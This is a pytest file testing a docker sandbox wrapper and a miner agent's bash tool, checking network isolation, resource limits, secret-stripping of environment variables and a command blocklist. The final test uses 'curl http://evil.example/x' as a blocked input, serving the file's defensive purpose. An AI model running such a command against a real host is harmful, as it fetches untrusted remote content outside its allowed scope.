"""
Sandbox command construction and mode resolution (validator/sandbox.py).

No test here starts a container: wrap_command is a pure translation
function, and the mode/probe logic is exercised with the probe cache
forced. Live docker behavior is an operator concern covered by the
validating guide.
"""
import os
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest

from validator import sandbox


@pytest.fixture(autouse=True)
def _fresh_probe():
    sandbox.reset_probe_cache()
    yield
    sandbox.reset_probe_cache()


def test_wrap_translates_repo_paths_and_interpreter(tmp_path):
    repo = str(tmp_path)
    cmd = [sys.executable, "-m", "pytest", f"{repo}/tests/test_x.py"]
    env = {"PYTHONPATH": f"{repo}/src:{repo}", "PYTHONNOUSERSITE": "1"}
    wrapped = sandbox.wrap_command(cmd, repo, env=env, image="img:1")

    assert wrapped[:3] == ["docker", "run", "--rm"]
    assert "--network=none" in wrapped
    assert f"{os.path.abspath(repo)}:/work" in wrapped
    assert "-e" in wrapped
    assert "PYTHONPATH=/work/src:/work" in wrapped
    assert "PYTHONNOUSERSITE=1" in wrapped
    tail = wrapped[wrapped.index("img:1") + 1:]
    assert tail == ["python3", "-m", "pytest", "/work/tests/test_x.py"]


def test_wrap_env_allowlist_blocks_secrets(tmp_path):
    env = {
        "ANTHROPIC_API_KEY": "sk-secret",
        "AWS_SECRET_ACCESS_KEY": "leak",
        "PATH": "/usr/bin",
        "PYTHONDONTWRITEBYTECODE": "1",
        "LANG": "C.UTF-8",
    }
    wrapped = sandbox.wrap_command(["pytest"], str(tmp_path), env=env,
                                    image="img:1")
    joined = " ".join(wrapped)
    assert "sk-secret" not in joined
    assert "leak" not in joined
    assert "PYTHONDONTWRITEBYTECODE=1" in wrapped
    assert "LANG=C.UTF-8" in wrapped
    assert "HOME=/tmp" in wrapped


def test_wrap_sets_resource_limits(tmp_path, monkeypatch):
    monkeypatch.setenv("BITSWARM_SANDBOX_CPUS", "3")
    monkeypatch.setenv("BITSWARM_SANDBOX_MEM", "8g")
    wrapped = sandbox.wrap_command(["make", "test"], str(tmp_path),
                                    image="img:1")
    assert "--cpus=3" in wrapped
    assert "--memory=8g" in wrapped
    assert "--pids-limit=512" in wrapped


def test_wrap_names_container_when_asked(tmp_path):
    wrapped = sandbox.wrap_command(["pytest"], str(tmp_path), image="img:1",
                                    container_name="bitswarm-gate-abc")
    assert "--name" in wrapped
    assert "bitswarm-gate-abc" in wrapped


def test_mode_off_never_probes_docker(monkeypatch):
    monkeypatch.setenv("BITSWARM_SANDBOX", "off")

    def boom(*a, **k):
        raise AssertionError("docker probe should not run in off mode")

    monkeypatch.setattr(sandbox, "docker_available", boom)
    assert sandbox.is_active() is False


def test_mode_docker_hard_fails_without_docker(monkeypatch):
    monkeypatch.setenv("BITSWARM_SANDBOX", "docker")
    monkeypatch.setattr(sandbox, "docker_available", lambda *a: False)
    with pytest.raises(RuntimeError, match="BITSWARM_SANDBOX=docker"):
        sandbox.is_active()


def test_mode_auto_falls_back_with_warning(monkeypatch, capsys):
    monkeypatch.setenv("BITSWARM_SANDBOX", "auto")
    monkeypatch.setattr(sandbox, "docker_available", lambda *a: False)
    assert sandbox.is_active() is False
    assert "UNSANDBOXED" in capsys.readouterr().out
    # Second call stays quiet: one warning per process.
    assert sandbox.is_active() is False
    assert "UNSANDBOXED" not in capsys.readouterr().out


def test_mode_auto_activates_with_docker(monkeypatch):
    monkeypatch.setenv("BITSWARM_SANDBOX", "auto")
    monkeypatch.setattr(sandbox, "docker_available", lambda *a: True)
    assert sandbox.is_active() is True


def test_invalid_mode_rejected(monkeypatch):
    monkeypatch.setenv("BITSWARM_SANDBOX", "yes-please")
    with pytest.raises(RuntimeError, match="expected auto, docker, or off"):
        sandbox.sandbox_mode()


def test_run_host_mode_preserves_semantics(tmp_path, monkeypatch):
    monkeypatch.setenv("BITSWARM_SANDBOX", "off")
    result = sandbox.run(
        [sys.executable, "-c", "import os; print(os.getcwd())"],
        str(tmp_path),
    )
    assert result.returncode == 0
    assert result.stdout.strip() == str(tmp_path)


def test_run_docker_mode_wraps_command(tmp_path, monkeypatch):
    monkeypatch.setenv("BITSWARM_SANDBOX", "docker")
    monkeypatch.setattr(sandbox, "docker_available", lambda *a: True)
    seen = {}

    def fake_run(cmd, **kwargs):
        seen["cmd"] = cmd
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    monkeypatch.setattr(sandbox.subprocess, "run", fake_run)
    sandbox.run(["pytest", "-q"], str(tmp_path))
    assert seen["cmd"][:2] == ["docker", "run"]
    assert "--network=none" in seen["cmd"]


# --------------------------------------------- miner agent bash tool

def test_agent_bash_routes_through_sandbox(tmp_path, monkeypatch):
    from miner import tools

    tools.configure(str(tmp_path), allowed_files=["a.py"])
    seen = {}

    def fake_sandboxed_run(cmd, repo_root, env=None, timeout=300,
                            cwd=None):
        seen["cmd"] = cmd
        seen["repo_root"] = repo_root
        return subprocess.CompletedProcess(cmd, 0, stdout="ok",
                                            stderr="")

    monkeypatch.setattr(sandbox, "run", fake_sandboxed_run)
    out = tools.execute_bash({"command": "echo ok"})
    assert seen["cmd"] == ["sh", "-c", "echo ok"]
    assert seen["repo_root"] == str(tmp_path)
    assert "[exit code: 0]" in out


def test_agent_bash_host_mode_semantics(tmp_path, monkeypatch):
    from miner import tools

    monkeypatch.setenv("BITSWARM_SANDBOX", "off")
    tools.configure(str(tmp_path), allowed_files=["a.py"])
    out = tools.execute_bash({"command": "echo hello && pwd"})
    assert "hello" in out
    assert str(tmp_path) in out
    assert "[exit code: 0]" in out


def test_agent_bash_blocklist_still_applies():
    from miner.tools import validate_bash

    ok, why = validate_bash({"command": "curl http://evil.example/x"})
    assert ok is False
    assert "curl" in why
    ok, _ = validate_bash({"command": "python -m pytest tests/"})
    assert ok is True
